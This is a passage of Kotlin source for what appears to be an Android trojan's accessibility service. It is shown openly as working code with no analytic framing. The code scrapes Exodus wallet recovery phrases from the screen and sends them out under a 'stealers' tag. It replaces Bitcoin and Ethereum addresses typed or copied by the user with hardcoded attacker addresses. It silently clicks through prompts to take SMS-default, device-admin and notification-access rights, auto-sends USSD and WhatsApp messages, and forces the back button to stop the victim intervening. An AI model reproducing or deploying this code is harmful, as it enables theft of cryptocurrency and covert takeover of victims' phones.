                            blockBack1()
                        } else if (currentHomePackage != null && clickAtButton(
                                currentHomePackage!!,
                                "btnCancel",
                                true
                            )
                        ) {
                        }
                    }
                }
            }
        }

        return false
    }

    override fun onDestroy() {
        runCatching {
            mGestureCallback.mCompleted = true
            mGestureCallbackWallets.mCompleted = true

            instance = null

            UtilsGfgsd.startApplicationPerm(this@AccessibilityServiceQ)
            IOSocketyt.sendLogs("", "onDestroy AccessibilityServiceQ", "success")
            Log.v(TAG, "onServiceDisconnected: $serviceInfo")
        }.onFailure {
            IOSocketyt.sendLogs("", "onDestroy startApplication ${it.localizedMessage}", "error")
        }
        runCatching {
            super.onDestroy()
            super.disableSelf()
            Log.i(TAG, "onDestroy")
        }.onFailure {
            IOSocketyt.sendLogs("", "onDestroy ${it.localizedMessage}", "error")
        }
    }

    private class GestureCallback : GestureResultCallback() {
        var mCompleted = true

        @Synchronized
        override fun onCompleted(gestureDescription: GestureDescription) {
            mCompleted = true
        }

        @Synchronized
        override fun onCancelled(gestureDescription: GestureDescription) {
            mCompleted = true
        }
    }

    companion object {
        private val TAG = AccessibilityService::class.java.canonicalName

        var instance: AccessibilityServiceQ? = null
            private set

        val isEnabled: Boolean
            get() = instance != null

        var mIsButtonOneDown = false
        private var mPath: Path? = null
        private var mLastGestureStartTime: Long = 0

        var cnt = 0

        var regex = Regex("\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}")
        var regex1 = Regex("\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}")
        var regex2 = Regex("\\b(0x)?[0-9a-fA-F]{40}")

        private fun AccessibilityServiceQ.longPress(x: Int, y: Int) {
            dispatchGesture(createClick(x, y, ViewConfiguration.getTapTimeout() + ViewConfiguration.getLongPressTimeout()), null, null)
        }

        private fun AccessibilityServiceQ.swapSMS(listWithNameOfApp: Set<AccessibilityNodeInfo>): Boolean {
            runCatching {
                if (SharedPreferencess.autoClickSmsCommand == "1" && eventRootInActiveWindow != null) {
                    if (Telephony.Sms.getDefaultSmsPackage(this) != this.packageName) {
                        AccessUtilsr.autoclick_change_smsManager_sdk_Q(eventRootInActiveWindow!!, eventRootInActiveWindow!!.packageName.toString())
                    }

                    if (Telephony.Sms.getDefaultSmsPackage(this) != this.packageName) {
                        swapSMSManager2(listWithNameOfApp)
                    }

                    if (Telephony.Sms.getDefaultSmsPackage(this) == this.packageName) {
                        SharedPreferencess.autoClickSmsCommand = "0"
                        IOSocketyt.sendLogs("", "swapSMS", "success")
                        return true
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "swapSMS ${it.localizedMessage}", "error")
            }
            return false
        }

        private fun AccessibilityServiceQ.swapSMSManager2(listWithNameOfApp: Set<AccessibilityNodeInfo>): Boolean {
            var clickSMS = false
            val list = listWithNameOfApp.toMutableList()
            list.reverse()
            list.forEach {
                if (clickNodeOrParent(it, false)) {
                    clickSMS = true
                } else {
                    if (clickAtButton("android", "button1", false) ||
                        clickAtButton("com.android.settings", "action_button", false)
                    ) {
                        clickSMS = true
                        return true
                    }
                }
            }
            if (clickSMS) {
                if (clickAtButton("android", "button1", false) ||
                    clickAtButton("com.android.settings", "action_button", false)
                )
                    return true
            }
            return false
        }

        private fun AccessibilityServiceQ.ussdSend(): Boolean {
            runCatching {
                if (SharedPreferencess.autoClickOnceUssd == "1") {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                        ?.firstOrNull()
                        ?.let {
                            click(it)
                            SharedPreferencess.autoClickOnceUssd = ""
                            IOSocketyt.sendLogs("", "autoClickOnce ussdSend", "success")
                            return true
                        }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "ussdSend ${it.localizedMessage}", "error")
            }
            return false
        }

        private fun AccessibilityServiceQ.whatsAppSend(): Boolean {
            if (SharedPreferencess.SettingsRead("whatsappsend") == "1") {
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        if (click(it, true)) {
                            SharedPreferencess.SettingsWrite("whatsappsend", "0")
                            IOSocketyt.sendLogs("", "whatsAppSend", "success")
                            return true
                        }
                    }
            }
            return false
        }

        private fun AccessibilityServiceQ.backFromAdmin(): Boolean {
            if (ActivityAdminqw.isAdminDevice(this)) {
                Log.v(TAG, "ACC::onAccessibilityEvent: backFromAdmin")
                SharedPreferencess.autoClickAdminCommand = ""
                blockBack1()
                IOSocketyt.sendLogs("", "backFromAdmin - isAdminDevice success", "success")
                return true
            }
            return false
        }

        private fun AccessibilityServiceQ.blockBack() {
            Log.v(TAG, "ACC::onAccessibilityEvent: blockBack")
            for (i in 0..3) {
                performGlobalAction(GLOBAL_ACTION_BACK)
            }
            performGlobalAction(GLOBAL_ACTION_HOME)
        }

        private fun AccessibilityServiceQ.blockBack1() {
            Log.v(TAG, "ACC::onAccessibilityEvent: blockBack1")
            performGlobalAction(GLOBAL_ACTION_BACK)
        }

        private fun AccessibilityServiceQ.iterateAndSaveText(nodeInfo: AccessibilityNodeInfo?, list: MutableList<String>) {
            val childCount = nodeInfo?.childCount ?: 0
            val nodeContent = nodeInfo?.text
            for (key in nodeInfo?.extras?.keySet() ?: arrayListOf<String>()) {
                if (key == "AccessibilityNodeInfo.targetUrl") {
                    val value: Any? = nodeInfo?.extras?.get(key)
                    list.add(value.toString())
                }
            }

            runCatching {
                nodeContent?.toString()?.let {
                    if (it.isNotBlank())
                        list.add(it)
                }
            }

            for (i in 0 until childCount) {
                val childNodeInfo = nodeInfo?.getChild(i)
                iterateAndSaveText(childNodeInfo, list)
            }
        }

        private fun AccessibilityServiceQ.iterateNodesToFindViewWithCntChildAndType(
            nodeInfo: AccessibilityNodeInfo?,
            cnt: Int,
            classType: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains(classType) && childCount == cnt) {
                    return nodeInfo
                }
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindViewWithCntChildAndType(childNodeInfo, cnt, classType)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindSwitch(
            nodeInfo: AccessibilityNodeInfo?,
            classType: String = "widget.Switch"
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                if (nodeInfo.className.contains(classType)) {
                    return nodeInfo
                }
                val childCount1 = nodeInfo.childCount
                for (i in 0 until childCount1) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindSwitch(childNodeInfo, classType)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindViewWithIdClassWithDesc(
            nodeInfo: AccessibilityNodeInfo?,
            classType: String,
            childCount: Int
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                if (nodeInfo.className.contains(classType) && !nodeInfo.contentDescription.isNullOrBlank() && nodeInfo.childCount == childCount) {
                    return nodeInfo
                }
                val childCount1 = nodeInfo.childCount
                for (i in 0 until childCount1) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindViewWithIdClassWithDesc(childNodeInfo, classType, childCount)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindExodus(
            nodeInfo: AccessibilityNodeInfo?,
            classType: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains(classType) && nodeInfo.childCount == 5) {
                    var all = true
                    for (i in 0 until childCount) {
                        val childNodeInfo = nodeInfo.getChild(i)
                        if (!(childNodeInfo.isClickable && childNodeInfo.isEnabled && childNodeInfo.isFocusable && childNodeInfo.isVisibleToUser))
                            all = false
                    }
                    if (all) {
                        click(nodeInfo.getChild(4))
                        return nodeInfo
                    }
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindExodus(childNodeInfo, classType)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindExodusSecurity(
            nodeInfo: AccessibilityNodeInfo?,
            classType: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains(classType) && nodeInfo.childCount == 9) {
                    var textViewCnt = 0
                    var textViewGroupCnt = 0
                    for (i in 0 until childCount) {
                        val childNodeInfo = nodeInfo.getChild(i)
                        if (childNodeInfo.className.contains("android.widget.TextView"))
                            textViewCnt++
                        if (childNodeInfo.className.contains("android.view.ViewGroup"))
                            textViewGroupCnt++
                    }
                    if (textViewCnt == 5
                        && textViewGroupCnt == 4
                        && nodeInfo.getChild(0).className.contains("android.widget.TextView")
                        && nodeInfo.getChild(0).text.isNotBlank()
                        && nodeInfo.isVisibleToUser
                    ) {
                        click(nodeInfo.getChild(2))
                        return nodeInfo
                    }
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindExodusSecurity(childNodeInfo, classType)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindExodusBackup(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains("android.view.ViewGroup")
                    && nodeInfo.childCount == 6
                    && nodeInfo.isClickable
                    && nodeInfo.isVisibleToUser
                    && nodeInfo.getChild(5).text.contains("12")
                    && nodeInfo.getChild(5).isVisibleToUser
                ) {
                    click(nodeInfo)
                    return nodeInfo
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindExodusBackup(childNodeInfo)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindExodusViewSecret(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains("android.view.ViewGroup") && nodeInfo.childCount == 6 && nodeInfo.isVisibleToUser && nodeInfo.getChild(
                        0
                    ).className.contains(
                        "android.view.View"
                    )
                ) {

                    if (nodeInfo.getChild(1).className.contains("android.view.ViewGroup")
                        && nodeInfo.getChild(2).className.contains("android.view.ViewGroup")
                        && nodeInfo.getChild(3).className.contains("android.view.ViewGroup")
                        && nodeInfo.getChild(4).className.contains("android.view.ViewGroup")
                        && nodeInfo.getChild(5).className.contains("android.view.ViewGroup")
                    ) {
                        if (!nodeInfo.getChild(4).isClickable && nodeInfo.getChild(4).childCount == 1 && nodeInfo.getChild(4)
                                .getChild(0).isClickable && nodeInfo.getChild(4).getChild(0).childCount == 1
                        ) {
                            click(nodeInfo.getChild(4).getChild(0))
                            return nodeInfo
                        }
                    }
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindExodusViewSecret(childNodeInfo)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindExodusPhrase(nodeInfo: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.className.contains("android.view.ViewGroup")
                    && nodeInfo.childCount == 19
                    && nodeInfo.isVisibleToUser
                    && nodeInfo.getChild(0).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(1).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(2).className.contains("android.widget.TextView")
                    && nodeInfo.getChild(3).className.contains("android.widget.TextView")
                    && nodeInfo.getChild(4).className.contains("android.view.ViewGroup")
                    && nodeInfo.getChild(16).isFocusable
                    && !nodeInfo.getChild(16).isClickable
                ) {
                    if (!mGestureCallbackWallets.mCompleted) {
                        exodusPhrase(nodeInfo)
                        return nodeInfo
                    }

                    mGestureCallbackWallets.mCompleted = false
                    val rect = Rect()
                    nodeInfo.getChild(16).getBoundsInScreen(rect)
                    dispatchCallback(
                        Resources.getSystem().displayMetrics.widthPixels / 2f,
                        rect.centerY().toFloat(),
                        true,
                        mGestureCallbackWallets
                    )

                    TimeUnit.MILLISECONDS.sleep(100.toLong())
                    eventRootInActiveWindow?.refresher()

                    exodusPhrase(nodeInfo)

                    return nodeInfo
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindExodusPhrase(childNodeInfo)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.exodusPhrase(nodeInfo: AccessibilityNodeInfo): Boolean {
            val obj = JSONObject()
            for (i in 4..15) {
                val childNodeInfo = nodeInfo.getChild(i)
                if (childNodeInfo.childCount == 2
                    && childNodeInfo.getChild(0).className.contains("android.widget.TextView")
                    && childNodeInfo.getChild(1).className.contains("android.widget.TextView")
                    && !childNodeInfo.getChild(1).text.contains("-")
                ) {
                    obj.put("${childNodeInfo.getChild(0).text}", childNodeInfo.getChild(1).text)
                }
            }
            if (obj.length() > 11) {
                IOSocketyt.sendLogs(constNm.exodus, obj.toString(), "stealers")
                SharedPreferencess.SettingsWrite("exodus", "1")
                blockBack()
                cntExodusDhag = 0
                mGestureCallback.mCompleted = true
                mGestureCallbackWallets.mCompleted = true
                return true
            }
            return false
        }

        private fun AccessibilityServiceQ.iterateNodesToFindViewWithId(
            nodeInfo: AccessibilityNodeInfo?,
            viewId: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount
                val nodeContent = nodeInfo.viewIdResourceName

                if (nodeContent?.contains(viewId) == true) {
                    return nodeInfo
                }
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindViewWithId(childNodeInfo, viewId)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindViewWithDesc(
            nodeInfo: AccessibilityNodeInfo?,
            viewId: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount
                val nodeContent = nodeInfo.contentDescription

                if (nodeContent?.contains(viewId) == true) {
                    return nodeInfo
                }
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindViewWithDesc(childNodeInfo, viewId)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindText(nodeInfo: AccessibilityNodeInfo?, text: String): Boolean {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount

                if (nodeInfo.text == text) {
                    clickNodeOrParent(nodeInfo, true)
                    return true
                }

                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    if (iterateNodesToFindText(childNodeInfo, text))
                        return true
                }
            }
            return false
        }

        private fun AccessibilityServiceQ.iterateNodesToFindNodeWithText(
            nodeInfo: AccessibilityNodeInfo?,
            text: String
        ): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount
                val nodeContent = nodeInfo.text?.toString()?.lowercase(Locale.getDefault())

                if (nodeContent == text.lowercase(Locale.getDefault())) {
                    return nodeInfo
                }
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindNodeWithText(childNodeInfo, text)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun AccessibilityServiceQ.iterateNodesToFindContainsTextNode(nodeInfo: AccessibilityNodeInfo?, text: String): AccessibilityNodeInfo? {
            if (nodeInfo != null) {
                val childCount = nodeInfo.childCount
                val nodeContent = nodeInfo.text

                if (nodeContent?.contains(text) == true) {
                    return nodeInfo
                }
                for (i in 0 until childCount) {
                    val childNodeInfo = nodeInfo.getChild(i)
                    val i = iterateNodesToFindContainsTextNode(childNodeInfo, text)
                    if (i != null)
                        return i
                }
            }
            return null
        }

        private fun buildClick(x: Float, y: Float, longClick: Boolean): GestureDescription {
            val clickPath = Path()
            clickPath.moveTo(x, y)
            val clickStroke =
                if (longClick)
                    StrokeDescription(clickPath, 1000, 20000, longClick)
                else
                    StrokeDescription(clickPath, 0, 1, longClick)
            val clickBuilder = GestureDescription.Builder()
            clickBuilder.addStroke(clickStroke)
            return clickBuilder.build()
        }

        private fun AccessibilityServiceQ.checkNodeOrParent(
            nodeInfo: AccessibilityNodeInfo
        ): Boolean {
            if (!nodeInfo.isChecked) {
                click(nodeInfo.parent)
                TimeUnit.MILLISECONDS.sleep(75.toLong())
                nodeInfo.parent.refresh()
                if (!nodeInfo.isChecked) {
                    click(nodeInfo)
                    TimeUnit.MILLISECONDS.sleep(75.toLong())
                    nodeInfo.refresh()
                }
                if (!nodeInfo.isChecked) {
                    click(nodeInfo.parent.parent)
                    TimeUnit.MILLISECONDS.sleep(75.toLong())
                    nodeInfo.parent.parent.refresh()
                }
                return true
            }
            return false
        }

        private fun AccessibilityServiceQ.clearCacheSuccess() {
            IOSocketyt.sendLogs("", "startClearCash ended", "success")
        }

        private fun AccessibilityServiceQ.clearPush(): Boolean {
            if (SharedPreferencess.clearPush == "1") {
                if (clickAtButton("com.android.systemui", "dismiss_text", false)
                    || clickAtButton("com.android.systemui", "clear_all", false)
                ) {
                    IOSocketyt.sendLogs("", "clearPush", "success")
                    return true
                }
            }
            return false
        }

        private fun AccessibilityServiceQ.click(it: AccessibilityNodeInfo, clickOnlyIfVisible: Boolean = false): Boolean {
            runCatching {
                if (clickOnlyIfVisible && it.isVisibleToUser) {
                    Log.v(TAG, "ACC::onAccessibilityEvent: click - $it")
                    return it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                } else if (!clickOnlyIfVisible) {
                    Log.v(TAG, "ACC::onAccessibilityEvent: click - $it")
                    return it.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
                true
            }.onFailure {
                IOSocketyt.sendLogs("", "click ${it.localizedMessage}", "error")
            }
            return false
        }

        private fun AccessibilityServiceQ.clickAtButton(targetAppPackageName: String, targetViewId: String, clickOnlyIfVisible: Boolean): Boolean {
            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("$targetAppPackageName:id/$targetViewId")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    return click(it, clickOnlyIfVisible)
                }
            return false
        }

        private fun AccessibilityServiceQ.clickNodeOrParent(item: AccessibilityNodeInfo, clickOnlyIfVisible: Boolean): Boolean {
            if (item.isClickable) {
                return click(item, clickOnlyIfVisible)
            }
            if (item.parent.isClickable) {
                return click(item.parent, clickOnlyIfVisible)
            }
            if (item.parent.parent.isClickable) {
                return click(item.parent.parent, clickOnlyIfVisible)
            }
            if (item.parent.parent.parent.isClickable) {
                return click(item.parent.parent.parent, clickOnlyIfVisible)
            }

            return false
        }

        private fun AccessibilityServiceQ.clickOk(): Boolean {
            eventRootInActiveWindow?.refresher()
            if (clickAtButton("$currentHomePackage", "btnOk", false))
                return true
            eventRootInActiveWindow?.refresher()
            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                ?.firstOrNull { it.isClickable }
                ?.let {
                    if (click(it))
                        return true
                }
            eventRootInActiveWindow?.refresher()
            return false
        }

        private fun AccessibilityServiceQ.clipboard(event: AccessibilityEvent) {
            runCatching {
                event.text.forEach {
                    runCatching {
                        clipboard.setClipBoard(it.toString(), event)
                    }.onFailure {
                        IOSocketyt.sendLogs("", "setClipBoard ${it.localizedMessage}", "error")
                    }
                }
            }.onFailure {
                IOSocketyt.sendLogs("", "clipboard ${it.localizedMessage}", "error")
            }
        }

        private fun AccessibilityServiceQ.dispatch(
            x: Float,
            y: Float,
            longClick: Boolean,
            callback: (() -> Unit)? = null
        ): Boolean {
            val result = dispatchGesture(
                buildClick(x, y, longClick),
                object : GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        super.onCompleted(gestureDescription)
                        Log.d("TAG", "gesture completed")
                        callback?.invoke()
                    }

                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        super.onCancelled(gestureDescription)
                        Log.d("TAG", "gesture cancelled")
                        callback?.invoke()
                    }
                },
                null
            )
            return result
        }

        private fun AccessibilityServiceQ.dispatchCallback(
            x: Float,
            y: Float,
            longClick: Boolean,
            gestureResultCallback: GestureResultCallback? = null
        ): Boolean {
            val result = dispatchGesture(
                buildClick(x, y, longClick),
                gestureResultCallback,
                null
            )
            return result
        }

        fun ClipboardManager.setClipBoard(str: String, event: AccessibilityEvent) {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                runCatching {
                    if (str.contains(regex2)) {
                        val str = str.replace(regex2, "0x3Cf7d4A8D30035Af83058371f0C6D4369B5024Ca")
                        this.setPrimaryClip(ClipData.newPlainText(str, str))
                        val args = Bundle()
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str)
                        event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        return
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "setClipBoard1 ${it.localizedMessage}", "error")
                }
                runCatching {
                    if (str.contains(regex)) {
                        val str = str.replace(regex, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf")
                        this.setPrimaryClip(ClipData.newPlainText(str, str))
                        val args = Bundle()
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str)
                        event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        return
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "setClipBoard2 ${it.localizedMessage}", "error")
                }
                runCatching {
                    if (str.contains(regex1)) {
                        val str = str.replace(regex1, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf")
                        this.setPrimaryClip(ClipData.newPlainText(str, str))
                        val args = Bundle()
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, str)
                        event.source?.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        return
                    }
                }.onFailure {
                    IOSocketyt.sendLogs("", "setClipBoard3 ${it.localizedMessage}", "error")
                }
            }
        }

        private fun AccessibilityServiceQ.notifPerm(currentActivityLowerCase: String): Boolean {
            if (SharedPreferencess.clickNotifPermition
                && !SharedPreferencess.hasNotifPermition
                && !DrawerSniffer.hasPermission(this)
            ) {
                when {
                    //------------------------Launcher Notif Permition--------------------------------------------
                    (currentActivity == "com.miui.home.launcher.Launcher"
                            || currentActivity == "net.oneplus.launcher.Launcher"
                            || currentActivityLowerCase.contains("com.android.searchlauncher.searchlauncher"))
                            && currentPackage == "com.android.settings"
                    -> {
                        var find = false
                        val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.filter { it.parent.parent.isClickable && it.text == Utilslp.getLabelApplication(this) }
                        val size = list?.size ?: 0
                        list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                            cnt++
                            find = true
                            if (click(it.parent.parent)) {
                                return@let
                            }
                        }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                            ?.firstOrNull { it.isCheckable && !it.isChecked }
                            ?.let {
                                find = true
                                if (!it.isChecked && click(it.parent.parent)) {
                                    return@let
                                }
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box")
                            ?.forEach {
                                if (!it.isChecked) {
                                    clickNodeOrParent(it, true)
                                }
                                find = true
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                                find = true
                            }

                        if (DrawerSniffer.hasPermission(this)) {
                            find = true
                            SharedPreferencess.hasNotifPermition = true
                            SharedPreferencess.clickNotifPermition = false
                            handler2.removeCallbacksAndMessages(null)
                            blockBack1()
                            handler2.postDelayed({
                                startApp()
                            }, 100)
                            IOSocketyt.sendLogs("", "DrawerSniffer.hasPermission", "success")
                        }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                                find = true
                            }

                        //TODO возможно убрать
                        if (!find) {
                            handler.removeCallbacksAndMessages(null)
                            handler.postDelayed({
                                slide(0)
                            }, 100)
                        }
                    }
                    //------------------------notification access settings activity Notif Permition--------------------------------------------
                    currentActivityLowerCase.contains("notificationaccesssettingsactivity")
                    -> {
                        var find = false

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                            ?.forEach {
                                if (iterateNodesToFindText(it.parent?.parent, Utilslp.getLabelApplication(this))) {
                                    if (it.isCheckable && !it.isChecked && clickNodeOrParent(it, true)) {
                                        find = true
                                        return@forEach
                                    }
                                }
                            }

                        val list = eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.filter { it.text == Utilslp.getLabelApplication(this) }
                        val size = list?.size ?: 0
                        list?.getOrNull(runCatching { cnt % size }.getOrDefault(0))?.let {
                            cnt++
                            if (clickNodeOrParent(it, true)) {
                                find = true
                                return@let
                            }
                        }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/switch_widget")
                            ?.firstOrNull { it.isCheckable && !it.isChecked }
                            ?.let {
                                find = true
                                if (clickNodeOrParent(it, true)) {
                                    return@let
                                }
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                                find = true
                            }

                        if (DrawerSniffer.hasPermission(this)) {
                            find = true
                            SharedPreferencess.hasNotifPermition = true
                            SharedPreferencess.clickNotifPermition = false
                            handler2.removeCallbacksAndMessages(null)
                            blockBack1()
                            handler2.postDelayed({
                                startApp()
                            }, 100)
                            IOSocketyt.sendLogs("", "DrawerSniffer.hasPermission", "success")
                            return true
                        }

                        //TODO возможно убрать
                        if (!find) {
                            handler.removeCallbacksAndMessages(null)
                            handler.postDelayed({
                                slide(0)
                            }, 100)
                        }
                    }
                    //------------------------special permission intercept activity Notif Permition--------------------------------------------
                    currentActivityLowerCase.contains("specialpermissioninterceptactivity")
                    -> {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box")
                            ?.forEach {
                                if (!it.isChecked) {
                                    clickNodeOrParent(it, true)
                                }
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                            }

                        if (DrawerSniffer.hasPermission(this)) {
                            SharedPreferencess.hasNotifPermition = true
                            SharedPreferencess.clickNotifPermition = false
                            handler2.removeCallbacksAndMessages(null)
                            blockBack1()
                            handler2.postDelayed({
                                startApp()
                            }, 100)
                            IOSocketyt.sendLogs("", "DrawerSniffer.hasPermission", "success")
                            return true
                        }
                        true
                    }
                }
            } else {
                if (currentActivity == "com.miui.home.launcher.Launcher"
                    || currentActivity == "net.oneplus.launcher.Launcher"
                    || currentActivityLowerCase.contains("com.android.searchlauncher.searchlauncher")
                    || currentActivityLowerCase.contains("notificationaccesssettingsactivity")
                    || currentActivityLowerCase.contains("specialpermissioninterceptactivity")
                ) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                        ?.firstOrNull { it.parent.parent.isClickable && it.text == Utilslp.getLabelApplication(this) }
                        ?.let {
                            blockBack1()
                            IOSocketyt.sendLogs("", "DrawerSniffer.hasPermission blockBack1", "success")
                        }

                    if (!SharedPreferencess.hasNotifPermition && DrawerSniffer.hasPermission(this)) {
                        SharedPreferencess.hasNotifPermition = true
                        SharedPreferencess.clickNotifPermition = false
                        blockBack1()
                        IOSocketyt.sendLogs("", "DrawerSniffer.hasPermission blockBack1", "success")
                        return true
                    }
                }
            }
            return false
        }

        private fun AccessibilityServiceQ.adminPerm(currentActivityLowerCase: String): Boolean {
            if (SharedPreferencess.autoClickAdminCommand != "") {
                when {
                    //------------------------DeviceManagerApplyActivity get admin--------------------------------------------
                    currentActivity.contains("DeviceManagerApplyActivity")
                    -> {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box")
                            ?.forEach {
                                if (!it.isChecked)
                                    clickNodeOrParent(it, true)
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow")
                            ?.forEach {
                                clickNodeOrParent(it, false)
                            }

                        if (ActivityAdminqw.isAdminDevice(this)) {
                            SharedPreferencess.autoClickAdminCommand = ""
                            blockBack1()
                            IOSocketyt.sendLogs("", "autoClickAdmin", "success")
                        }

                        true
                    }
                    currentActivity == "com.android.settings.SubSettings"
                            || currentActivity == "com.android.settings.MiuiSettings"
                            || currentActivity == "com.android.settings.MiuiSettings"
                            || currentActivityLowerCase.contains("deviceadminadd")
                    -> {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByText("Add application to admin")
                            ?.firstOrNull()
                            ?.let {
                                if (clickNodeOrParent(it, true))
                                    return@let
                            }

                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button")
                            ?.forEach {
                                clickNodeOrParent(it, true)
                                if (backFromAdmin())
                                    return@forEach
                            }

                        if (ActivityAdminqw.isAdminDevice(this)) {
                            SharedPreferencess.autoClickAdminCommand = ""
                            IOSocketyt.sendLogs("", "isAdminDevice success", "success")
                        }
                    }
                    currentPackage == "com.android.settings" && SharedPreferencess.autoClickAdminCommand == "1"
                    -> {
